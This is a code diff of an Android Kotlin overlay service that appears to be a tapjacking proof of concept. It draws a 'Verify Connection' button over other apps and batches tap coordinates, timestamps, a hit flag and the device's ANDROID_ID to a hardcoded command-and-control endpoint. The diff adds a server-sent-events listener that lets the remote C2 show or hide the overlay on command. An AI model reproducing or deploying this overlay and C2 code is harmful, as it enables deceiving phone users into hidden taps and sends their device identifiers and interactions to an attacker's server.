@@ -14,7 +14,6 @@ import android.util.Log
 import android.view.Gravity
 import android.view.MotionEvent
 import android.view.View
-import android.view.View.OnTouchListener
 import android.view.WindowManager
 import android.widget.Button
 import android.widget.FrameLayout
@@ -22,25 +21,36 @@ import android.widget.Toast
 import androidx.core.app.NotificationCompat
 import java.net.HttpURLConnection
 import java.net.URL
-import java.io.OutputStreamWriter
 import java.util.concurrent.Executors
 import java.util.concurrent.LinkedBlockingQueue
 import java.util.concurrent.TimeUnit
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 class OverlayService : Service() {
 
     private lateinit var wm: WindowManager
     private var overlayView: FrameLayout? = null
+    private var visualMaskElement: Button? = null // Declare at class level
     private var overlayVisible = false
 
     // Batching & Network components
     private val tapQueue = LinkedBlockingQueue<TapEvent>()
     private val c2Executor = Executors.newSingleThreadExecutor()
     private val batchScheduler = Executors.newScheduledThreadPool(1)
-    private val C2_ENDPOINT = "http://192.168.100.250:3000/tj/report-taps"
+    private val C2_ENDPOINT = "http://192.168.1.165:3000/tj/report-taps"
+    private val SSE_ENDPOINT = "http://192.168.1.165:3000/tj/stream"
     private var deviceId: String = ""
 
-    data class TapEvent(val x: Int, val y: Int, val count: Int, val timestamp: Long)
+    // Data class without hit count
+    data class TapEvent(
+        val x: Int,
+        val y: Int,
+        val timestamp: Long,
+        val is_jacked: Boolean,
+        val element_text: String
+    )
 
     override fun onCreate() {
         super.onCreate()
@@ -48,6 +58,9 @@ class OverlayService : Service() {
         deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
         startForeground(NOTIF_ID, buildNotification())
         createOverlay()
+
+        // Start real-time SSE listener for remote C2 commands
+        startSseListener()
 
         // Schedule batch transmission every 2 seconds
         batchScheduler.scheduleAtFixedRate({
@@ -67,7 +80,6 @@ class OverlayService : Service() {
         overlayView?.let {
             try { wm.removeView(it) } catch (_: Throwable) {}
         }
-        // Flush remaining taps before service termination
         sendBatchToC2()
         batchScheduler.shutdownNow()
         c2Executor.shutdownNow()
@@ -82,11 +94,13 @@ class OverlayService : Service() {
         val offsetX = 0
         val offsetY = 400
 
+        // 1. Root container matched to the button size
         val overlay = FrameLayout(this).apply {
             setBackgroundColor(Color.TRANSPARENT)
             visibility = FrameLayout.GONE
         }
 
+        // 2. The visual jacker button
         val visualMaskElement = Button(this).apply {
             text = "Verify Connection"
             setBackgroundColor(Color.parseColor("#E6C23350"))
@@ -97,39 +111,31 @@ class OverlayService : Service() {
             )
         }
 
-        visualMaskElement.setOnTouchListener(object : OnTouchListener {
-            private var localTapCount = 0
+        // 3. Touch listener directly on the button
+        visualMaskElement.setOnTouchListener { _, event ->
+            if (event.action == MotionEvent.ACTION_DOWN) {
+                val rawX = event.rawX.toInt()
+                val rawY = event.rawY.toInt()
+                val timestamp = System.currentTimeMillis()
 
-            override fun onTouch(v: View?, event: MotionEvent): Boolean {
-                if (event.action == MotionEvent.ACTION_DOWN) {
-                    localTapCount++
-                    val rawX = event.rawX.toInt()
-                    val rawY = event.rawY.toInt()
-                    val timestamp = System.currentTimeMillis()
+                Toast.makeText(
+                    applicationContext,
+                    "🎯 JACKPOT! Button Hit Captured",
+                    Toast.LENGTH_SHORT
+                ).show()
 
-                    Toast.makeText(
-                        applicationContext,
-                        "PoC Target Hit! Tap #$localTapCount\nCoords: X=$rawX Y=$rawY",
-                        Toast.LENGTH_SHORT
-                    ).show()
+                visualMaskElement.text = "HIT VERIFIED"
+                visualMaskElement.setBackgroundColor(Color.parseColor("#FF3300"))
 
-                    Log.w(
-                        "OfflineTapValidation",
-                        "Target Intercept -> Tap detected at X: $rawX, Y: $rawY"
-                    )
-
-                    visualMaskElement.text = "TAP #$localTapCount VERIFIED"
-                    visualMaskElement.setBackgroundColor(Color.parseColor("#FF3300"))
-
-                    // Enqueue tap event for batch processing
-                    tapQueue.offer(TapEvent(rawX, rawY, localTapCount, timestamp))
-                }
-                return false
+                // Enqueue successful jacker hit
+                tapQueue.offer(TapEvent(rawX, rawY, timestamp, true, visualMaskElement.text.toString()))
             }
-        })
+            false
+        }
 
         overlay.addView(visualMaskElement)
 
+        // 4. Window layout params sized specifically to the button widget
         val params = WindowManager.LayoutParams(
             elementWidth,
             elementHeight,
@@ -159,6 +165,45 @@ class OverlayService : Service() {
         overlayView?.visibility = FrameLayout.GONE
     }
 
+    private fun startSseListener() {
+        c2Executor.execute {
+            while (!Thread.currentThread().isInterrupted) {
+                var connection: HttpURLConnection? = null
+                try {
+                    val url = URL(SSE_ENDPOINT)
+                    connection = url.openConnection() as HttpURLConnection
+                    connection.requestMethod = "GET"
+                    connection.setRequestProperty("Accept", "text/event-stream")
+                    connection.connectTimeout = 15000
+                    connection.readTimeout = 0
+
+                    val reader = java.io.BufferedReader(java.io.InputStreamReader(connection.inputStream))
+                    var line: String?
+
+                    while (reader.readLine().also { line = it } != null) {
+                        if (line!!.startsWith("data: ")) {
+                            val command = line!!.substring(6).trim()
+                            android.os.Handler(mainLooper).post {
+                                when (command) {
+                                    "show" -> showOverlay()
+                                    "hide" -> hideOverlay()
+                                }
+                            }
+                        }
+                    }
+                } catch (e: Exception) {
+                    try {
+                        Thread.sleep(5000)
+                    } catch (_: InterruptedException) {
+                        break
+                    }
+                } finally {
+                    connection?.disconnect()
+                }
+            }
+        }
+    }
+
     private fun buildNotification(): Notification {
         val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
 
@@ -185,57 +230,52 @@ class OverlayService : Service() {
         tapQueue.drainTo(batch)
         if (batch.isEmpty()) return
 
-        c2Executor.execute {
+        CoroutineScope(Dispatchers.IO).launch {
             var connection: HttpURLConnection? = null
             try {
+                Log.d("C2Client", "Sending batch of ${batch.size} taps to $C2_ENDPOINT...")
                 val url = URL(C2_ENDPOINT)
                 connection = url.openConnection() as HttpURLConnection
                 connection.requestMethod = "POST"
                 connection.doInput = true
                 connection.doOutput = true
                 connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
-                connection.connectTimeout = 10000
-                connection.readTimeout = 10000
+                connection.connectTimeout = 5000
+                connection.readTimeout = 5000
 
-                // 1. Build guaranteed-valid JSON using org.json (built into Android)
                 val tapsArray = org.json.JSONArray()
                 for (tap in batch) {
                     tapsArray.put(org.json.JSONObject().apply {
                         put("x", tap.x)
                         put("y", tap.y)
-                        put("count", tap.count)
-                        put("ts", tap.timestamp) // Fixed: matches your data class
+                        put("ts", tap.timestamp)
+                        put("is_jacked", tap.is_jacked)
+                        put("element_text", tap.element_text)
                     })
                 }
+
                 val payload = org.json.JSONObject().apply {
                     put("device_id", deviceId)
                     put("taps", tapsArray)
                 }.toString()
 
-                // 2. Explicitly set Content-Length to prevent Uvicorn HTTP parsing errors
                 val payloadBytes = payload.toByteArray(Charsets.UTF_8)
                 connection.setRequestProperty("Content-Length", payloadBytes.size.toString())
 
-                // 3. Write payload
                 connection.outputStream.use { os ->
                     os.write(payloadBytes)
                     os.flush()
                 }
 
-                val responseCode = connection.responseCode
-                Log.d("C2Client", "Batch sent. Code: $responseCode, Taps: ${batch.size}")
-            } catch (e: java.net.ConnectException) {
-                Log.e("C2Client", "Connection refused. Verify IP/Port.", e)
-            } catch (e: java.net.SocketTimeoutException) {
-                Log.e("C2Client", "Timeout. Check routing/firewall.", e)
+                val code = connection.responseCode
+                Log.d("C2Client", "POST Success! Server HTTP Response Code: $code")
             } catch (e: Exception) {
-                Log.e("C2Client", "C2 batch transmission failed", e)
+                Log.e("C2Client", "POST Failed with Exception: ${e.message}", e)
             } finally {
                 connection?.disconnect()
             }
         }
     }
-
 
     companion object {
         const val ACTION_SHOW = "overlay_show"
